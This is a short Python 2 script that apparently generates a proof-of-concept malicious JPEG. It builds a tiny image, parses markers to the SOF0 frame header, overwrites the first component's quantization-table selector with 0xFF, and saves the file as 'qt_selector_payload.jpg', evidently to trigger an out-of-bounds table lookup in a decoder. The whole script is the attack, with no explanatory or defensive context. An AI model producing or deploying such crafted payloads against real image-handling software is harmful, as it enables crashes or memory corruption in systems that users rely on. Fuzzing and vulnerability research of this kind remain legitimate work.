from PIL import Image
from struct import pack, unpack

JPEG_ESC_CHAR      = 0xFF

JPEG_SAMPLING_1x1  = 0x11

JPEG_MARKER_SOI    = 0xffd8
JPEG_MARKER_EOI    = 0xffd9
JPEG_MARKER_DHT    = 0xffc4
JPEG_MARKER_DQT    = 0xffdb
JPEG_MARKER_SOF0   = 0xffc0
JPEG_MARKER_SOS    = 0xffda
JPEG_MARKER_DRI    = 0xffdd
JPEG_MARKER_RST0   = 0xffd0
JPEG_MARKER_RST1   = 0xffd1
JPEG_MARKER_RST2   = 0xffd2
JPEG_MARKER_RST3   = 0xffd3
JPEG_MARKER_RST4   = 0xffd4
JPEG_MARKER_RST5   = 0xffd5
JPEG_MARKER_RST6   = 0xffd6
JPEG_MARKER_RST7   = 0xffd7
JPEG_MARKER_APP0   = 0xffe0

global seek_pos
seek_pos = 0

def read_byte(fp): return ord(fp.read(1))

def read_word(fp): return unpack(">H", fp.read(2))[0]

def get_marker(fp):

	if read_byte(fp) != JPEG_ESC_CHAR:
		print "[-] jpeg: invalid maker"
		return -1
	else: 
		marker = 0xFF << 8 | read_byte(fp)
		return marker	

def jpeg_handle_huff_table(fp):
	size = read_word(fp)
	fp.seek(fp.tell() + size - 2)	

def jpeg_handle_quan_table(fp):
	size = read_word(fp)
	fp.seek(fp.tell() + size - 2)	

def jpeg_handle_sof(fp):
	curr = fp.tell()
	size = read_word(fp)
	sof  = ""
	sof += pack(">H", JPEG_MARKER_SOF0)
	sof += pack(">H", size)
	sof += fp.read(size - 2)
	return curr, sof

def jpeg_handle_sos(fp):
	size = read_word(fp)
	sos  = ""
	sos += pack(">H", JPEG_MARKER_SOF0)
	sos += pack(">H", size)
	sos += fp.read(size - 2)

	# find size of SOS compressed data
	curr = fp.tell()
	fp.seek(-2, 2)
	jpeg_eoi = fp.tell()
	size_sos = jpeg_eoi - curr
	fp.seek(curr)

	sos += fp.read(size_sos)	
	return sos, sos[size - 2 + 2 + 2:]

def jpeg_handle_dri(fp):
	size = read_word(fp)
	fp.seek(fp.tell() + size - 2)	

def jpeg_handle_app(fp):
	size = read_word(fp)
	fp.seek(fp.tell() + size - 2)

def jpeg_handle_unknown(fp):	
	size = read_word(fp)
	fp.seek(fp.tell() + size - 2)

width  = 16
height = 16

im = Image.frombytes("RGB", (width, height), "B" * width * height * 3)
im.convert("YCbCr")
im.save("base.jpg", "JPEG", optimize=True)

im_fp = open("base.jpg", "rb")
image = bytearray(im_fp.read())
im_fp.seek(0)

while True:
	marker = get_marker(im_fp)
	if marker == JPEG_MARKER_SOI:
		print "JPEG_MARKER_SOI"
	elif marker == JPEG_MARKER_EOI:
		print "JPEG_MARKER_EOI"
		break
	elif marker == JPEG_MARKER_DHT:
		print "JPEG_MARKER_DHT"
		jpeg_handle_huff_table(im_fp)
	elif marker == JPEG_MARKER_DQT:
		print "JPEG_MARKER_DQT"
		jpeg_handle_quan_table(im_fp)
	elif marker == JPEG_MARKER_SOF0:
		print "JPEG_MARKER_SOF0"
		pos, sof = jpeg_handle_sof(im_fp)
		break
	elif marker == JPEG_MARKER_SOS:
		print "JPEG_MARKER_SOS"
		sos, sos_data = jpeg_handle_sos(im_fp)
	elif marker == JPEG_MARKER_DRI:
		print "JPEG_MARKER_DRI"
		jpeg_handle_dri(im_fp)
	elif marker == JPEG_MARKER_APP0:
		print "JPEG_MARKER_APP0"
		jpeg_handle_app(im_fp)
	else:
		print "Marker Unknown"
		jpeg_handle_unknown(im_fp) 

im_fp.seek(0)
jpeg = bytearray(im_fp.read())
jpeg[pos+10] = 0xff

f = open("qt_selector_payload.jpg", "wb")
f.write(jpeg)
f.close()
